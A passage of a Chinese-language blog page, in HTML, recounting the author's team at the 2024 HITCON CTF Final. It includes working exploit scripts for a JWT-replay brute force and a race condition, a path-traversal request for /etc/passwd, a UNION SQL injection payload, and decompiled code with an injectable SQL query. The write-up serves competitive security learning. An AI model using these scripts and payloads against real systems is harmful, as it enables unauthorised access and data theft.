@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allRank: 10&#x2F;Taiwan StarTeam: 星爆牛炒竹狐(Starburst Beef Stir-Fried BambooFox)   今年我與星爆牛炒竹狐的夥(大)伴(佬)們一同組隊參與了HITCON CTF FINAL，雖然現場只能有四名選手在場，但能作為場外支援火力一同參與這場CTFer們的盛事我依然很興奮XD   Finalists   我(們)打MM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 HITCON CTF FINAL 隨筆">
+<meta property="og:url" content="http://wha13.github.io/2024/11/10/hitcon-final-2024/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allRank: 10&#x2F;Taiwan StarTeam: 星爆牛炒竹狐(Starburst Beef Stir-Fried BambooFox)   今年我與星爆牛炒竹狐的夥(大)伴(佬)們一同組隊參與了HITCON CTF FINAL，雖然現場只能有四名選手在場，但能作為場外支援火力一同參與這場CTFer們的盛事我依然很興奮XD   Finalists   我(們)打MM">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk5v5kTbke.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyKVNlpWkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJz39ea-1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkdhElpZ1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJg1HgTZJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryigBgabJe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJdndx6-1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1fsKlTb1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryx9jgTb1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJiCv70-yg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ35dN0byx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkcbKERWyx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HygLtVA-yl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJOFFE0-1e.png">
+<meta property="article:published_time" content="2024-11-10T17:01:15.000Z">
+<meta property="article:modified_time" content="2025-01-20T15:02:28.441Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="HITCON">
+<meta property="article:tag" content="A&amp;D">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/Bk5v5kTbke.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2024 HITCON CTF FINAL 隨筆</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/17/nhnc-2024-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/07/pwnable-tw-hacknote/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/11/10/hitcon-final-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&text=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&is_video=false&description=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2024 HITCON CTF FINAL 隨筆&body=Check out this article: http://wha13.github.io/2024/11/10/hitcon-final-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&title=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/11/10/hitcon-final-2024/&name=2024 HITCON CTF FINAL 隨筆&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/11/10/hitcon-final-2024/&t=2024 HITCON CTF FINAL 隨筆"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1"><span class="toc-number">2.</span> <span class="toc-text">Day 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-Attack-through-reusing-JWT-Token"><span class="toc-number">2.1.</span> <span class="toc-text">Oracle Attack through reusing JWT Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI"><span class="toc-number">2.2.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Race-Condition"><span class="toc-number">2.3.</span> <span class="toc-text">Race Condition</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injections"><span class="toc-number">2.4.</span> <span class="toc-text">SQL Injections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%B5%90"><span class="toc-number">2.5.</span> <span class="toc-text">小結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day2"><span class="toc-number">3.</span> <span class="toc-text">Day2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">4.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2024 HITCON CTF FINAL 隨筆
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-10T17:01:15.000Z" class="dt-published" itemprop="datePublished">2024-11-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/A-D/" rel="tag">A&D</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/HITCON/" rel="tag">HITCON</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Rank: 10&#x2F;Taiwan Star<br>Team: 星爆牛炒竹狐(Starburst Beef Stir-Fried BambooFox)  </p>
+<p>今年我與星爆牛炒竹狐的夥(大)伴(佬)們一同組隊參與了HITCON CTF FINAL，雖然現場只能有四名選手在場，但能作為場外支援火力一同參與這場CTFer們的盛事我依然很興奮XD  </p>
+<p>Finalists<br><img src="https://hackmd.io/_uploads/Bk5v5kTbke.png" alt="image">  </p>
+<p>我(們)打MMM(和一坨知名隊伍)，認真？！</p>
+<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>Anyway，第一天一開始的題目有三題，分別是：  </p>
+<ul>
+<li><ol>
+<li>KoH-ed25519：一個要混淆ed25519簽證，並想辦法破解別人混淆的題目</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>A&amp;D-ucontext：Pwn題，沒看 😃</li>
+</ol>
+</li>
+<li><ol start="5">
+<li>A&amp;D-fulu：一個廟宇的網站，白箱，CGI app</li>
+</ol>
+</li>
+</ul>
+<p>疑，所以3, 4題呢？<br><del>To be continued</del>，一開始沒公布  </p>
+<p>看到這個分布，由於開賽的分配是現場組先看第一題，我自然就去看第五題啦~~<br><del>然後就矇了</del>，一個interpreter.py和一坨無法解釋的圖片….沒錯，被混淆了！<br>(<del>甚至是拿圖片當opcode</del>)<br>痾…生為一個web狗可不能輕易放棄，<del>就開始打黑箱吧XD</del><br>web服務<br><img src="https://hackmd.io/_uploads/HyKVNlpWkg.png" alt="image"><br>其實有hardcoded cred(user&#x2F;pass)，不過因為可以註冊帳號所以根本無所謂XD<br>但是登入有SQLi… 🤔<br><img src="https://hackmd.io/_uploads/HJz39ea-1l.png" alt="image">  </p>
+<p>不惑無法讀檔 😑，就先放著了<br>這時候點下任何一個FUNCTION都會跳出像這樣的alert：<br><img src="https://hackmd.io/_uploads/rkdhElpZ1e.png" alt="image"><br>不過其實把官方檔案打開就會知道一些html templates<br><img src="https://hackmd.io/_uploads/HJg1HgTZJx.png" alt="image">  </p>
+<h3 id="Oracle-Attack-through-reusing-JWT-Token"><a href="#Oracle-Attack-through-reusing-JWT-Token" class="headerlink" title="Oracle Attack through reusing JWT Token"></a>Oracle Attack through reusing JWT Token</h3><p>轉轉逛逛，就看到了這個！<br><img src="https://hackmd.io/_uploads/ryigBgabJe.png" alt="image">  </p>
+<p><code>/poe</code>的路徑是一個擲籤的模擬器，連續42遍聖籤就可以拿flag<br>架上Burp Suite觀察機制：主要就是user送出request -&gt; 獲得新的JWT紀錄本次分數<br><strong>不會無緣無故多一個不能打的服務在題目裡</strong><br>抱著這樣的心態，嘗試打一些JWT相關攻擊發現無果，腦袋轉了兩圈…<br>鯨（驚）！<br>如果我在本次的JWT紀錄到N次，那我不斷拿當前的TOKEN嘗試，直到拿到的TOKEN紀錄的不是0而是N+1不就可以做到100%連續聖籤了嗎？！<br><strong>brute_poe.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">datas, url</span>):</span><br><span class="line">    web = req.post(url+<span class="string">&#x27;/login&#x27;</span>, data=datas)</span><br><span class="line">    cookie = web.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(web.text)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Got Cookie: <span class="subst">&#123;cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]:cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_poe</span>(<span class="params"><span class="built_in">id</span>, url, cookies</span>):</span><br><span class="line">    web = req.post(url+<span class="string">&#x27;/poe&#x27;</span>, data=&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;Throw&quot;</span>&#125;, cookies=cookies)</span><br><span class="line">    cookie = web.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;[*] Got Cookie: &#123;cookie.split(&#x27;;&#x27;)[0].split(&#x27;=&#x27;)&#125;&quot;)</span></span><br><span class="line">    cur_times=cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    cur_times=b64decode(cur_times+<span class="string">&#x27;=&#x27;</span>*(<span class="built_in">len</span>(cur_times)%<span class="number">4</span>), validate=<span class="literal">False</span>).decode()</span><br><span class="line">    cur_times=json.loads(cur_times)[<span class="string">&#x27;poe_times&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(cur_times)&gt;<span class="built_in">id</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">id</span>==<span class="number">41</span>:</span><br><span class="line">            <span class="built_in">print</span>(cookie+<span class="string">&#x27;\n&#x27;</span>, web.text+<span class="string">&#x27;\n&#x27;</span>, web.headers)</span><br><span class="line">            <span class="keyword">return</span> web.text</span><br><span class="line">        <span class="keyword">return</span> &#123;cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]:cookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    cookies=login(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;user&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>&#125;, url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>, <span class="number">42</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            </span><br><span class="line">            cur=brute_poe(i, url, cookies)</span><br><span class="line">            <span class="keyword">if</span> cur:</span><br><span class="line">                <span class="keyword">if</span> i==<span class="number">41</span>:</span><br><span class="line">                    <span class="built_in">print</span>(cur)</span><br><span class="line">                    <span class="keyword">return</span> cur</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[*] cur=<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    cookies=cur</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack(&#x27;172.19.0.2&#x27;, 80)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>背景圖片url長這樣：<br><code>http://172.19.0.2/static/background.png</code><br>今天如果請求<code>/static//etc/passwd</code>呢？<br><img src="https://hackmd.io/_uploads/rJdndx6-1l.png" alt="image"><br>扯www  </p>
+<h3 id="Race-Condition"><a href="#Race-Condition" class="headerlink" title="Race Condition"></a>Race Condition</h3><p><code>/credit</code>有一個DONATE的功能，如果捐超過10000萬元可以GET FLAG<br>但是一但累積超過10000元就會被禁止捐款…<br>這是在隊伍ELK攔截看到的內容：<br><img src="https://hackmd.io/_uploads/B1fsKlTb1e.png" alt="image"><br>可以看到有人在同一秒進行了兩次捐款並GET FLAG!<br>基本上可以猜測後端流程是：<code>donate -&gt; 確認加上當前捐款後是否&gt;=10000 -&gt; 更新db</code><br>patch方法可以是先更新db，一旦超過就只讓他們捐到9999<br>最後把這個發現丟給隊友生腳本我就先去看別題了 zzz<br><strong>race.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># 隊友 Ball45 的腳本</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxy = &#123;</span></span><br><span class="line"><span class="comment">#     &#x27;http&#x27;: &#x27;http://localhost:8080&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_and_login</span>(<span class="params">s, url, username, password</span>):</span><br><span class="line">    resp = s.post(url=url, data=&#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;) <span class="comment"># , proxies=proxy)</span></span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Register failed, service might be down&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_string</span>(<span class="params">length=<span class="number">10</span></span>):</span><br><span class="line">    ascii_characters = string.ascii_letters + string.digits</span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(ascii_characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">donate</span>(<span class="params">s, url, username</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: username, <span class="string">&quot;money&quot;</span>: <span class="string">&quot;9999&quot;</span>&#125;</span><br><span class="line">    s.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_flag</span>(<span class="params">s, url</span>):</span><br><span class="line">    resp = s.get(url=url)</span><br><span class="line">    <span class="built_in">print</span>(resp.text.rstrip())</span><br><span class="line">    <span class="keyword">return</span> resp.text.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_race_condition</span>(<span class="params">ip, port</span>):</span><br><span class="line">    session = requests.session()</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&#x27;</span></span><br><span class="line">    username, password = random_string(), random_string()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> register_and_login(session, url+<span class="string">&#x27;/register&#x27;</span>, username, password):</span><br><span class="line">        threads = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            thread = threading.Thread(target=donate, args=(session, url+<span class="string">&#x27;/credit&#x27;</span>, username,))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fetch_flag(session, url+<span class="string">&#x27;/credit/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="comment">#     for i in range(1, 14):</span></span><br><span class="line"><span class="comment">#         exploit_race_condition(f&#x27;10.102.&#123;i&#125;.40&#x27;, 8081)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL-Injections"><a href="#SQL-Injections" class="headerlink" title="SQL Injections"></a>SQL Injections</h3><p>其實剛剛credits路徑有個?name的參數可以取得user的<br><code>/credit?name=user&#39; UNION SELECT &#39;meow&#39;, &#39;whale</code><br><img src="https://hackmd.io/_uploads/ryx9jgTb1l.png" alt="image"><br>XDD，所以到底要怎麼用呢，明天拭目以待！  </p>
+<h3 id="小結"><a href="#小結" class="headerlink" title="小結"></a>小結</h3><p>第一天成功靠著黑箱先幫隊伍砍下這題攻擊分（jwt重放的梗全場疑似只有我在玩），強大的隊友卡比(Chummy)好像也寫出interpreter的decoderㄌ<br>不過明天我暫定被調度到第三題的KoH玩api，還有GCC面試…<br>加油 XD  </p>
+<h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><p>最後題單長這樣<br><img src="https://hackmd.io/_uploads/SJiCv70-yg.png" alt="image">  </p>
+<ul>
+<li><ol start="3">
+<li>KoH-infinite-craft：不斷組合元素的遊戲，並且各隊伍提出各自最複雜的配方讓別人猜</li>
+</ol>
+</li>
+<li><ol start="6">
+<li>攻防，pwn</li>
+</ol>
+</li>
+</ul>
+<p>先來 sync 下第一天fulu的後續，強者我隊友們成功把圖片byte code轉完了，能更仔細code review和patchㄌ，昨天我寫的攻擊也在各隊的SLA都能通過後開始瘋狂刷分 🔥<br>對了，SQL Injection其實在點燈的功能能被利用：  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">serve_light</span>(<span class="params">arg1, arg2, arg3</span>):</span><br><span class="line"><span class="comment"># Var header start</span></span><br><span class="line">    username = <span class="number">0</span></span><br><span class="line">    enable = <span class="number">0</span></span><br><span class="line">    timestamp = <span class="number">0</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    _2c411011 = <span class="number">0</span></span><br><span class="line"><span class="comment"># Var header end</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> verify_jwt(parse_cookie().get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>))):</span><br><span class="line">        <span class="keyword">return</span> send_status(<span class="number">403</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    username = verify_jwt(parse_cookie().get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>)).get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;template/light.html&quot;</span>).close()</span><br><span class="line">    connect()[<span class="number">1</span>].execute((<span class="string">&quot;SELECT name, timestamp FROM light WHERE name=&#x27;%s&#x27;&quot;</span> % (username)))</span><br><span class="line">    